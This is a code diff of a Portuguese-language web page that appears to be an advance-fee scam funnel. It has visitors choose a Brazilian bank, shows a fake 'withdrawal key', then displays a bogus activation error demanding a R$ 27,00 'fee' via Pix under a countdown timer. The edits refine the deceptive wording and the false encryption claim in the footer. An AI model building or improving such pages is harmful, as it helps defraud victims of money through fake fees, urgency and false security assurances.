@@ -122,12 +122,12 @@
         </div>
 
         <div id="p5" class="page text-center">
-            <h2 class="text-xl font-black mb-6 uppercase">Onde deseja sacar?</h2>
+            <h2 class="text-xl font-black mb-6 uppercase">Selecione o Banco que irá utilizar sua Chave:</h2>
             <div class="grid grid-cols-2 gap-2 mb-8">
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">ITAÚ</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BRADESCO</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">CAIXA</div>
-                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BB</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BANCO DO BRASIL</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">SANTANDER</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">NUBANK</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">INTER</div>
@@ -144,9 +144,9 @@
         </div>
 
         <div id="p7" class="page text-center">
-            <h2 class="text-xl font-black mb-6 uppercase italic">Chave de Saque Gerada</h2>
+            <h2 class="text-xl font-black mb-6 uppercase italic">Chave de Saque Gerada com Sucesso!</h2>
             <div class="bg-gray-100 p-6 text-2xl font-mono font-black border-2 border-dashed border-gray-400 mb-8 rounded-xl">892-TX-2026</div>
-            <button onclick="finalLoader()" class="btn-modern">ATIVAR E SACAR AGORA</button>
+            <button onclick="finalLoader()" class="btn-modern">ATIVAR CHAVE E SACAR RENDIMENTOS</button>
         </div>
 
         <div id="p8" class="page text-center py-20">
@@ -160,18 +160,18 @@
                 <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Erro de Ativação</h3>
                 <p class="text-sm mb-6">Pague a <b>Taxa de Chave para Saque de Rendimentos (TAC)</b> e libere seu saldo imediatamente.</p>
                 <div class="bg-gray-100 p-6 rounded-xl mb-6"><p class="text-4xl font-black">R$ 27,00</p></div>
-                <button onclick="nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR</button>
+                <button onclick="nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR CHAVE</button>
             </div>
         </div>
 
         <div id="p10" class="page">
             <h2 class="text-xl font-black text-center mb-2 uppercase italic">Finalize a ativação da sua chave</h2>
-            <p class="text-center text-sm text-gray-500 mb-6 italic">Ative no seu banco para gerar seu saque</p>
+            <p class="text-center text-sm text-gray-500 mb-6 italic">Ative no seu banco selecionado para gerar seu saque</p>
             <div class="border p-6 rounded-xl text-center bg-gray-50 shadow-inner">
                 <p class="text-red-600 font-bold mb-4">EXPIRA EM: <span id="timer">05:00</span></p>
                 <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=CHAVE_PIX_AQUI" class="mx-auto mb-4 border-4 border-white">
                 <button onclick="alert('Copiado!')" class="w-full bg-blue-600 text-white font-black py-4 rounded-full mb-4">COPIA E COLA PIX</button>
-                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Protocolo 892 - Transação protegida por criptografia de dados Nacional (SSL 256-bit).</p>
+                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Protocolo 892 - Transação protegida por criptografia de dados (SSL 256-bit).</p>
             </div>
         </div>
 
